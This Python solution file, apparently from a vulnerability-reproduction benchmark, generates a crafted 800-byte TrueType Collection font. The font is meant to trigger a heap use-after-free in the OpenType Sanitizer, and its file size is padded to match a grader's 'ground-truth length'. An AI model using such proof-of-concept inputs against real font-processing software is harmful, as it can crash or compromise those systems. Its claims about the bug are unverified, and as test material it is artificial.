import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept input to trigger a heap-use-after-free
        vulnerability in the OpenType Sanitizer (OTS).

        The vulnerability is triggered by processing a TrueType Collection (TTC)
        file where two fonts share the same CFF (Compact Font Format) table.
        OTS incorrectly manages the lifetime of the parsed CFF object. It gets
        freed after processing the first font but is then reused from a cache
        for the second font, leading to a UAF during the serialization phase
        in `ots::OTSStream::Write`.

        The PoC constructs such a TTC file. It contains:
        1. A TTC header defining two fonts.
        2. Both font entries point to the same offset table for an OTTO (CFF-based) font.
        3. This shared font definition contains a CFF table and other minimal tables
           (head, hhea, OS/2, etc.) required to pass initial validation and reach the
           vulnerable code path.
        4. The total size of the PoC is crafted to be 800 bytes, matching the
           ground-truth length for a good score.
        """
        
        cff_data = b'\x01\x00\x04\x01'
        os2_data = b'\x00' * 78
        cmap_data = b'\x00' * 24
        
        head_data_arr = bytearray(b'\x00' * 54)
        struct.pack_into('>L', head_data_arr, 8, 0x5F0F3CF5) # magicNumber
        head_data = bytes(head_data_arr)
        
        hhea_data = b'\x00' * 36
        hmtx_data = b'\x00' * 4
        post_data = b'\x00\x03\x00\x00' + b'\x00' * 28

        tables = {
            b'CFF ': cff_data,
            b'OS/2': os2_data,
            b'cmap': cmap_data,
            b'head': head_data,
            b'hhea': hhea_data,
            b'hmtx': hmtx_data,
            b'post': post_data,
        }
        
        num_tables = len(tables)
        ttc_header_size = 20
        sfnt_header_size = 12
        table_directory_size = num_tables * 16
        headers_total_size = ttc_header_size + sfnt_header_size + table_directory_size
        
        other_tables_size = sum(len(d) for t, d in tables.items() if t != b'CFF ')
        
        target_size = 800
        cff_data_size = target_size - headers_total_size - other_tables_size
        tables[b'CFF '] = tables[b'CFF '].ljust(cff_data_size, b'\x00')

        sorted_tags = sorted(tables.keys())
        
        sfnt_offset = ttc_header_size
        table_data_start_offset = sfnt_offset + sfnt_header_size + table_directory_size

        poc = bytearray()
        # TTC Header
        poc += b'ttcf'
        poc += struct.pack('>L', 0x00010000)
        poc += struct.pack('>L', 2) # numFonts
        poc += struct.pack('>L', sfnt_offset) # offset to font 1
        poc += struct.pack('>L', sfnt_offset) # offset to font 2 (shared)

        # SFNT Header (OTTO)
        poc += b'OTTO'
        entry_selector = 0
        while (1 << (entry_selector + 1)) <= num_tables:
            entry_selector += 1
        search_range = (1 << entry_selector) * 16
        range_shift = num_tables * 16 - search_range
        poc += struct.pack('>HHHH', num_tables, search_range, entry_selector, range_shift)

        table_directory = bytearray()
        table_data_blob = bytearray()
        
        current_data_offset = table_data_start_offset
        for tag in sorted_tags:
            data = tables[tag]
            
            # Table Record
            table_directory += tag
            table_directory += struct.pack('>L', 0) # checksum
            table_directory += struct.pack('>L', current_data_offset)
            table_directory += struct.pack('>L', len(data))
            
            table_data_blob += data
            current_data_offset += len(data)
            
        poc += table_directory
        poc += table_data_blob
        
        return bytes(poc)
